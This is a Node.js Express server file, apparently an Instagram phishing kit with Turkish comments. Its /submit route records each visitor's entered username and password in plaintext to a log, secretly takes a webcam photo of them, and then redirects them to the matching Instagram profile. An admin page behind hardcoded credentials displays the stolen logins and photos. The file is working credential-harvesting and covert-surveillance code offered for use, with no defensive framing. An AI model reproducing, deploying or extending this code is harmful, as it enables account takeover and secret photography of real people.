const express = require('express');
const fs = require('fs');
const webcam = require('node-webcam');
const uuid = require('uuid');
const session = require('express-session');
const path = require('path'); // path modülünü ekleyin
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(session({ secret: 'your-secret-key', resave: true, saveUninitialized: true }));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '/views')); // path.join kullanarak dosya yolu oluşturun

const camera = webcam.create({
  width: 1280,
  height: 720,
  quality: 100,
  delay: 0,
  saveShots: true,
  output: 'jpeg',
  device: false,
  callbackReturn: 'location'
});

const authenticate = (req, res, next) => {
  if (req.session && req.session.isAdmin) {
    return next();
  } else {
    return res.redirect('/login');
  }
};

// "images" klasörünü statik dosya dizini olarak tanımlayın
app.use('/images', express.static(path.join(__dirname, 'images')));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.get('/admin', authenticate, (req, res) => {
  const logs = fs.readFileSync('logs.txt', 'utf8');
  const images = getImagesList();
  res.render('admin', { logs, images });
});

app.get('/login', (req, res) => {
  res.sendFile(__dirname + '/login.html');
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'password') {
    req.session.isAdmin = true;
    res.redirect('/admin');
  } else {
    res.redirect('/login');
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy((err) => {
    res.redirect('/');
  });
});

app.post('/submit', (req, res) => {
  const { username, password } = req.body;
  const uniqueFilename = `${uuid.v4()}.jpg`;
  const picturePath = `images/${uniqueFilename}`;
  
  camera.capture(picturePath, (err, data) => {

    const log = `Username: ${username}, Password: ${password}, Picture: ${uniqueFilename}\n`;
    fs.appendFile('logs.txt', log, (err) => {
      console.log('SUCCESS!');
    });
  });

  res.redirect(`https://www.instagram.com/${username}`);
});

function getImagesList() {
  const imagesDir = 'images';
  const files = fs.readdirSync(imagesDir);
  return files.filter(file => file.endsWith('.jpg')).map(file => `${imagesDir}/${file}`);
}

app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor.`);
});
